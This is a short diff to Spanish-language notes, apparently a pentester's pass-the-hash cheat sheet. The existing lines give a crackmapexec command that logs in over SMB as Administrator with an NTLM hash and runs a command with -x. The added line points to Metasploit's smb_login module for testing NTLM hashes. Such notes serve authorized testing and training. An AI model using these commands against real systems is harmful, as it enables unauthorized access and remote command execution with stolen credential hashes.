@@ -26,3 +26,7 @@ Con esta herramienta, con el parámetro -H podemos especificarle el uso del hash
 
 NOTA: añadiendo el parámetro -x "command" podemos ejecutar un comando:
 `crackmapexec smb <ip> -u Administrator -H <hash NTLM> -x "whoami"`
+
+
+
+NOTA: Podemos probar hashes NTLM usando el módulo` auxiliary/scanner/smb/smb_login`
